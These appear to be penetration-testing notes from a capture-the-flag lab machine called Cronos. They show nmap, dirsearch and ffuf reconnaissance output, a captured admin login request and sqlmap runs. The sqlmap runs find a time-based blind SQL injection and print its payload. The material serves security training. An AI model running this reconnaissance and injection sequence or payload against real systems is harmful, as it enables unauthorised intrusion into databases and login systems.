### Nmap

```bash
# Nmap 7.94SVN scan initiated Mon Dec 18 13:37:17 2023 as: nmap -p 22,53,80 -sCV -A -T4 -oN nmap/port-scan 10.129.40.5
Nmap scan report for 10.129.40.5
Host is up (0.038s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec 18 13:37:32 2023 -- 1 IP address (1 host up) scanned in 14.97 seconds
```


### Fuzzing
#### cronos.htb
```bash
# Dirsearch started Mon Dec 18 14:37:17 2023 as: /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://cronos.htb/ -o dirsearch

301   305B   http://cronos.htb/js    -> REDIRECTS TO: http://cronos.htb/js/
403   296B   http://cronos.htb/.ht_wsr.txt
403   301B   http://cronos.htb/.htaccess.sample
403   299B   http://cronos.htb/.htaccess.save
403   299B   http://cronos.htb/.htaccess.bak1
403   299B   http://cronos.htb/.htaccess.orig
403   300B   http://cronos.htb/.htaccess_extra
403   299B   http://cronos.htb/.htaccess_orig
403   297B   http://cronos.htb/.htaccess_sc
403   297B   http://cronos.htb/.htaccessBAK
403   298B   http://cronos.htb/.htaccessOLD2
403   297B   http://cronos.htb/.htaccessOLD
403   289B   http://cronos.htb/.htm
403   290B   http://cronos.htb/.html
403   299B   http://cronos.htb/.htpasswd_test
403   295B   http://cronos.htb/.htpasswds
403   296B   http://cronos.htb/.httr-oauth
403   289B   http://cronos.htb/.php
403   290B   http://cronos.htb/.php3
301   306B   http://cronos.htb/css    -> REDIRECTS TO: http://cronos.htb/css/
200     0B   http://cronos.htb/favicon.ico
404    11KB  http://cronos.htb/index.php/login/
200   449B   http://cronos.htb/js/
200    24B   http://cronos.htb/robots.txt
403   298B   http://cronos.htb/server-status
403   299B   http://cronos.htb/server-status/
200   914B   http://cronos.htb/web.config
```
#### Vhosts

```bash
# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://cronos.htb:80/ -H 'Host: FUZZ.cronos.htb' -fs 11439
admin                   [Status: 200, Size: 1547, Words: 525, Lines: 57, Duration: 74ms]
www                     [Status: 200, Size: 2319, Words: 990, Lines: 86, Duration: 88ms]
```

### SQLMap

```bash
Copied login request from Burp: login.request
"POST / HTTP/1.1
Host: admin.cronos.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://admin.cronos.htb
Connection: close
Referer: http://admin.cronos.htb/
Cookie: PHPSESSID=t62vl1eje8g2odne29i0l67qb4
Upgrade-Insecure-Requests: 1

username=admin&password=admin"

---------

┌──(kali㉿kali)-[~/Documents/Boxes/Cronos]
└─$ sqlmap -r login.request
[...SNIP...]
[20:35:54] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'.
[...SNIP...]
[20:36:43] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[...SNIP...]

┌──(kali㉿kali)-[~/Documents/Boxes/Cronos]
└─$ sqlmap -r login.request --level 3
[...SNIP...]
[20:38:20] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql')
[...SNIP...]

┌──(kali㉿kali)-[~/Documents/Boxes/Cronos]
└─$ sqlmap -r login.request --level 4 --dbms=mysql -p username
[...SNIP...]
sqlmap identified the following injection point(s) with a total of 937 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 7326 FROM (SELECT(SLEEP(5)))linY)-- LyrW&password=admin
---
'[...SNIP...]
```